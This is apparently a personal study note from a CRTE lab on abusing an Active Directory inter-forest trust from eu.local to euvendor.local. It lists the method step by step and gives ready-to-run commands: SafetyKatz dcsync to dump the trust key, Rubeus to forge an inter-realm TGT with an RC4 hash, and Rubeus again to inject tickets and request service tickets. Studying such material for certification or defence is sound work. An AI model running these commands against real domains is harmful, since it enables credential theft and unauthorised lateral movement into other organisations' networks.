# Methodology
>1. Dump the trust key of the child domain.
>2. Check if SID Filtering is enabled.
>3. Forge an inter-forest ticket.
>4. Inject the ticket. 
>5. Enumerate group RID > 1000 on the target domain.
>6. Forge an inter-forest ticket with special SIDS.
>7. Inject the ticket


>**ℹ️ Info:**
>In this example we go from `eu.local` to `euvendor.local` .

---
# Powershell
>**ℹ️ Info:**
>
> Remember to follow the [PowerShell scripts methodology](Notes/Certifications/CRTE/00%20-%20Miscellaneous/01-%20Methodology.md#PowerShell%20Scripts).

## AD Module
**Check if SID Filtering is enabled:**
```powershell
Get-ADTrust -Filter *
```

**Look for groups with RID higher than 1000:**
```powershell
Get-ADGroup -Filter 'SID -ge "S-1-5-21-4066061358-3942393892-617142613-1000"' -Server euvendor.local
```

---
# Binaries
>**ℹ️ Info:**
>
> Remember to follow the [binaries methodology](Notes/Certifications/CRTE/00%20-%20Miscellaneous/01-%20Methodology.md#Binaries).

## SafetyKatz
**Dump trust key for the inter-forest trust:**
```cmd
SafetyKatz.exe '"lsadump::dcsync /user:eu\euvendor$"'
```

## Rubeus

**Forge an inter-realm TGT:**
```cmd
Rubeus.exe silver /user:Administrator /ldap /service:krbtgt/eu.local /rc4:b96659c7b2109d2e63e6de676d48646c /sid:S-1-5-21-3657428294-2017276338-1274645009 /nowrap 
```

**Inject the ticket:**
```cmd
Rubeus.exe asktgs /ticket:doIFEzCCBQ /service:CIFS/euvendor-dc.euvendor.local /dc:euvendordc.euvendor.local /ptt
```

>**ℹ️ Info:**
>We can only access specific resources that are explicitly shared!

**Forge a TGS using inter-realm TGT:**
```cmd
Rubeus.exe asktgs /service:http/euvendornet.euvendor.local /dc:euvendor-dc.euvendor.local /ptt /ticket:doIFOzCCBT...
```